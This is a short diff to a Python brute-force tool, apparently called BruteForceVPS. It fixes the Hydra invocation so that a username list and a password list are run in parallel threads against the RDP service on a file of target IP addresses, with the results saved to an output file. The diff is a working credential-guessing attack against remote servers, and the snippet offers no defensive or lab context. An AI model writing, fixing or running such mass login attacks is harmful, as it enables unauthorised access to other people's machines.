@@ -57,7 +57,7 @@ class BruteForceVPS:
             t.join()
     
     def hydra_attack(self, hydra_thread=3):
-        os.system(f"hydra -t {hydra_thread} -L {self.username} -L {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
+        os.system(f"hydra -t {hydra_thread} -L {self.username} -P {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
     
     def clean_hydra_output(self):
         with open(file=self.hydra_output, mode="r", encoding="utf-8") as file:
